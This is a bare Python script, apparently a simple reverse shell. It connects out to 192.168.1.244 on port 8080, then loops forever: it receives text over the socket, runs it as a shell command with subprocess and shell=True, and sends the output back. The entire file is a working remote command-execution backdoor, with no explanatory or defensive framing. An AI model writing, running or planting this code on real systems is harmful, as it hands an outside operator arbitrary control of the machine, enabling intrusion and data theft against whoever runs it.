import socket
import time
import os
import subprocess
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.1.244', 8080))
print('Connecting')
time.sleep(1)
print('Connection established')
while True:
    message = client.recv(1024)
    message = message.decode()
    print(message)
    update = subprocess.check_output(message, shell=True)
    response = update
    print(response)
    client.send(response)
            
